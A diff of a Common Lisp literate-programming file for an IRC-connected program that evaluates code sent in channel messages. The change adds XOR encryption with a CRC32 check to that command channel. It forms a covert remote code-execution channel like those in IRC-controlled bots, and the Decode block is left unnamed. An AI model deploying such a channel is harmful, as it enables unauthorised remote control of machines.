@@ -427,43 +427,38 @@ irc-канала. Она должна возвращать T чтобы пред
   <<seq_xor>>
   ;; ecrypt
   <<encrypt>>
+
   ;; decrypt
   <<decrypt>>
+
+  ;; encode
+  <<encode>>
+
+  ;; decode
+  <<decode>>
 
   (defparameter *irc-cmd*
     (lambda (param)
       (block irc-cmd-block
-        (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
-               ;; (oct  (decrypt msg *irc-sess*))
-               ;; (str  (handler-case
-               ;;           (flex:octets-to-string oct :external-format :utf-8)
-               ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
-               (str msg)
-               )
-          (dbg "::COMMAND: [~A]~%" msg)
-          (dbg "::EVAL [~A]~%" str)
+        (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
+               (cmd (decode msg *irc-sess*)))
+          (dbg "::MSG: [~A]~%" msg)
+          (dbg "::CMD: [~A]~%" cmd)
           (finish-output)
-          (setf *watchdog-timer* 0)
-          (let ((result (handler-case (bprint (eval (read-from-string  str)))
-                          (t (err)
-                            (dbg "::irc-cmd error: ~A~%" (type-of err))
-                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
-                            (return-from irc-cmd-block nil)))))
+          (unless (null cmd)
             (setf *watchdog-timer* 0)
-            (sendmsg "=> ~A" result)
-            (dbg "::=> ~A~%" result)
-            (finish-output))))))
+            (let ((result (handler-case (bprint (eval (read-from-string  cmd)))
+                            (t (err)
+                              (dbg "::irc-cmd error: ~A~%" (type-of err))
+                              (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
+                              (return-from irc-cmd-block nil)))))
+              (setf *watchdog-timer* 0)
+              (sendmsg "=> ~A" result)
+              (dbg "::=> ~A~%" result)
+              (finish-output)))))))
 
-  ;; (encrypt
-  ;;  (flex:string-to-octets
-  ;;   "(progn (quit))"
-  ;;   :external-format :utf-8)
-  ;;  3783992823)
-
-  ;; (flex:octets-to-string
-  ;;  (decrypt
-  ;;   "62Y5gGs3D5BAEdec7Ls=" 3783992823)
-  ;;  :external-format :utf-8)
+  ;; example of send encoded cmd
+  (encode "(print 1)" *irc-sess*)
 #+END_SRC
 
 ** Sequence XOR
@@ -502,6 +497,38 @@ irc-канала. Она должна возвращать T чтобы пред
            (len (length oct))
            (gam (funcall gen len)))
       (seq-xor len oct gam)))
+#+END_SRC
+
+** Encode
+
+#+NAME: encode
+#+BEGIN_SRC lisp
+  (defun encode (cmd seed)
+    (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
+           (crc32   (ironclad:byte-array-to-hex-string
+                     (ironclad:digest-sequence :crc32 oct)))
+           (encoded (encrypt oct seed)))
+      (format nil "s/~A/~A" crc32 encoded)))
+#+END_SRC
+
+** Decode
+
+#+NAME:
+#+BEGIN_SRC lisp
+(defun decode (cmd seed)
+  (multiple-value-bind (match-p result)
+      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
+    (unless match-p
+      (return-from decode nil))
+    (destructuring-bind (crc32 cmd)
+        (coerce result 'list)
+      (let* ((oct (decrypt cmd seed))
+             (crc (ironclad:byte-array-to-hex-string
+                   (ironclad:digest-sequence :crc32 oct))))
+        (if (equal crc crc32)
+            (flex:octets-to-string oct :external-format :utf-8)
+            ;; else
+            nil)))))
 #+END_SRC
 
 * Snapshot function
@@ -1551,7 +1578,6 @@ SIMD-операций.
   ;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
 #+END_SRC
 
-
 * Assembly
 
 #+NAME:
@@ -1568,6 +1594,7 @@ SIMD-операций.
   (ql:quickload "prbs")
   (ql:quickload "cl-irc")
   (ql:quickload "cl-json")
+  (ql:quickload "ironclad")
 
   <<supervisor>>
 #+END_SRC
